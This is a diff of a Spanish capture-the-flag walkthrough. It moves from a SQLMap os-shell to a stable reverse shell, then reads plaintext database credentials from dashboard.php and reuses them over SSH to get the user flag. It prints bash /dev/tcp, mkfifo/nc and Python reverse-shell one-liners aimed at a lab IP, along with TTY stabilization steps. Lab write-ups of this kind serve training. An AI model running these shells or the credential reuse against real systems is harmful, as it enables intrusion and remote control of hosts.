@@ -188,7 +188,7 @@ La os-shell de SQLMap es incómoda y se cae. La solución es lanzarnos una **rev
 |**Reverse shell estable**|
 |_En tu Kali: listener a la escucha_<br><br>$ nc -lvnp 445<br><br>_Desde la os-shell de SQLMap: lanzar la reverse a TU IP y puerto_<br><br>$ bash -c 'bash -i >& /dev/tcp/10.10.14.67/445 0>&1'|
 |**ℹ  Anatomía del comando (no hay que memorizarlo)**<br><br>bash -c '...' ejecuta lo que va entre comillas · bash -i shell interactiva · >& /dev/tcp/IP/PUERTO redirige toda la E/S a una conexión TCP a tu equipo · 0>&1 ata la entrada estándar a esa misma conexión.<br><br>Lo único que cambias siempre es **la IP** (la tuya) y **el puerto** (el que pusiste a la escucha). Guárdalo en tu chuleta.|
-|**✔  Alternativas de reverse shell (Linux)**<br><br>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|/bin/bash -i 2>&1\|nc 10.10.14.67 445 >/tmp/f (FIFO clásico).<br><br>Python: python3 -c 'import socket,subprocess,os,pty;s=socket.socket();s.connect(("10.10.14.67",445));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/bash")'.<br><br>Genera el que necesites en **revshells.com** y pásalo por la os-shell.|
+|**✔  Alternativas de reverse shell (Linux)**<br><br>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.67 445 >/tmp/f (FIFO clásico).<br><br>Python: python3 -c 'import socket,subprocess,os,pty;s=socket.socket();s.connect(("10.10.14.67",445));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/bash")'.<br><br>Genera el que necesites en **revshells.com** y pásalo por la os-shell.|
 |**⚠  Estabilizar la TTY tras recibir la shell**<br><br>Para que no se rompa: python3 -c 'import pty;pty.spawn("/bin/bash")', luego Ctrl+Z, después stty raw -echo; fg, y export TERM=xterm.|
 
 ## 3.7 Credenciales en texto claro y acceso por SSH (flag de user)
@@ -198,7 +198,7 @@ Ya con shell estable, leemos dashboard.php en la ruta de la web. Ahí está la c
 | |
 |---|
 |**Credenciales → SSH → user.txt**|
-|_Localizar y leer el dashboard.php (ruta de la web)_<br><br>$ cat /var/www/html/dashboard.php<br><br>  -> usuario: postgres   \|   password: <en_texto_claro><br><br>_Reutilizar la contraseña por SSH_<br><br>$ ssh postgres@<IP><br><br>_Primera flag (usuario)_<br><br>$ ls<br><br>$ cat user.txt|
+|_Localizar y leer el dashboard.php (ruta de la web)_<br><br>$ cat /var/www/html/dashboard.php<br><br>  -> usuario: postgres   |   password: <en_texto_claro><br><br>_Reutilizar la contraseña por SSH_<br><br>$ ssh postgres@<IP><br><br>_Primera flag (usuario)_<br><br>$ ls<br><br>$ cat user.txt|
 |**⛔  Mala práctica detectada**<br><br>Tener la contraseña de la base de datos **en texto claro** dentro de un .php accesible es un fallo grave de configuración. El PHP normalmente no se ve desde el navegador (es backend), pero con acceso al sistema de ficheros queda expuesto.|
 |**✔  Si el SSH directo falla**<br><br>Comprueba el usuario exacto y que el puerto 22 esté accesible (ssh -v postgres@<IP> para depurar).<br><br>Si SSH rechaza por algoritmos antiguos: ssh -oHostKeyAlgorithms=+ssh-rsa postgres@<IP>.|
 
